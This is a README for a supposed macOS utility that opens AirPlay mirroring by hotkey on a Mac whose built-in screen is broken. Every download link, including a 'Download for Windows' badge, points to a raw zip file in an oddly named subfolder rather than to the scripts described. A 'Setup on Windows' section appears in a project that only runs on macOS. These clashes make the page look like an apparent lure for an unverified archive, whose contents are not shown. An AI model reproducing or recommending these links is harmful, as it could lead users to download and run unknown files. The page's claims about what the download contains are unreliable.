# 🖥️ headless-airplay-screen-mirror - Run AirPlay Without the Built-in Screen

[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip)

## 📥 Download

Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip

## 🪟 What this app does

This app helps a Mac start AirPlay even when the built-in screen does not work or cannot be seen. It is meant for a “halfbook pro” setup where you still need access to AirPlay after login.

It uses a simple flow:

1. AeroSpace starts when you log in.
2. You hear a startup chime.
3. You press `opt-f1` to open the AirPlay picker.
4. You choose a display and connect.

## ✅ What you need

- A Mac that can run Sequoia
- AirPlay enabled in macOS
- The screen mirror icon shown in the menu bar
- AeroSpace installed
- A keyboard with an `Option` key and `F1` key
- Access to the release page linked above

## 🚀 Getting Started

1. Open the releases page.
2. Download the app files from the latest release.
3. Put the files in a folder you can find again, such as Downloads or Applications.
4. Follow the setup steps below.
5. Log out and log back in if needed.
6. Press `opt-f1` to start the AirPlay flow.

## 🧭 How to use it

After setup, the app is meant to run from the login session. You do not need to open each file by hand every time.

When you are ready to connect:

1. Make sure you are logged in.
2. Wait for the startup chime.
3. Press `opt-f1`.
4. Wait for the device list.
5. Pick the AirPlay display you want.
6. The script connects to that display.

## 📂 Files in this repo

- `Airplay.sh`  
  Starts the AirPlay flow.

- `ListAirplayDevices.sh`  
  Finds nearby AirPlay targets and stores the list.

- `ConnectAirplay.sh`  
  Connects to the AirPlay display you chose.

- `.aerospace.toml`  
  Starts AeroSpace at login, plays the chime, and binds `opt-f1`.

## 🛠️ Setup on Windows

This repo is built for macOS, not Windows. If you are on Windows, use it as a reference for the macOS setup flow. To run the app itself, you need a Mac.

If you only need the files from Windows:

1. Open the releases page.
2. Download the release files.
3. Save them to a folder on your PC.
4. Move them to your Mac when you are ready to use them.

## 🍎 Setup on Mac

### 1. Download the release files

Open the releases page and download the latest release files.

### 2. Place the scripts in one folder

Keep these files together:

- `Airplay.sh`
- `ListAirplayDevices.sh`
- `ConnectAirplay.sh`

### 3. Install AeroSpace

Install AeroSpace on your Mac first. This repo expects AeroSpace to start at login.

### 4. Copy the AeroSpace config

Copy `.aerospace.toml` into your AeroSpace config path.

A common place is:

- `~/.config/aerospace/`

If that folder does not exist, create it first.

### 5. Enable the screen mirror icon

Make sure the screen mirror icon shows in the menu bar.

This matters because the AirPlay flow depends on it.

### 6. Log out and back in

Sign out of your Mac account and sign back in so the login setup can run.

### 7. Test the shortcut

Press:

- `Option + F1`

If the setup is correct, the AirPlay picker should open.

## 🔊 Startup chime

The repo uses a startup chime so you know the session is ready.

If you hear the chime after login, the AeroSpace session is up.

If you do not hear it:

1. Check that AeroSpace starts at login.
2. Check your sound output.
3. Make sure the config file is in the right place.

## 🖱️ AirPlay flow

The flow is simple and built for quick use:

1. Start the Mac.
2. Wait for login.
3. Hear the chime.
4. Press `opt-f1`.
5. Let the device scan finish.
6. Choose the display.
7. Connect.

This saves time when the built-in screen is not usable.

## 🔧 Troubleshooting

### `opt-f1` does nothing

Check these items:

- AeroSpace is installed
- AeroSpace starts at login
- `.aerospace.toml` is in the right config folder
- The shortcut is not being used by another app
- Your keyboard sends `F1` correctly

### No AirPlay devices appear

Try this:

- Make sure the AirPlay display is turned on
- Move closer to the target display
- Check that AirPlay is enabled on the network
- Run the device list step again

### The menu bar icon is missing

Do this:

- Open macOS settings
- Check menu bar and control options
- Turn on the screen mirror icon
- Log out and log in again

### The chime does not play

Check:

- Volume is on
- Output is set to the right device
- AeroSpace is running
- The login session has fully loaded

## 📋 Typical use case

This repo fits a setup where:

- the Mac still boots,
- the built-in screen is broken, dark, or not useful,
- you need AirPlay for display access,
- you want a simple shortcut to connect fast

## 🧩 What each script does

### `Airplay.sh`

This script starts the main AirPlay action. Use it when you want the whole flow to run.

### `ListAirplayDevices.sh`

This script scans for AirPlay targets and saves a device map. It helps the app know what displays are available.

### `ConnectAirplay.sh`

This script connects to the device you selected from the list.

### `.aerospace.toml`

This file sets up the login behavior. It starts AeroSpace, plays the chime, and binds `opt-f1`.

## 🔐 Safe use

These files are plain scripts and config text. Review them before you change anything. Keep a backup copy of your working config.

## 🧪 Tested setup

This repo has been tested on Sequoia.

If you use a later macOS version, the same flow should still be close, but menu items and shortcuts can change.

## 📎 Download again

Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip

## 📝 Basic setup checklist

- Download the release files
- Put the scripts in one folder
- Install AeroSpace
- Copy `.aerospace.toml`
- Enable the screen mirror icon
- Log out and back in
- Press `opt-f1`
- Choose an AirPlay display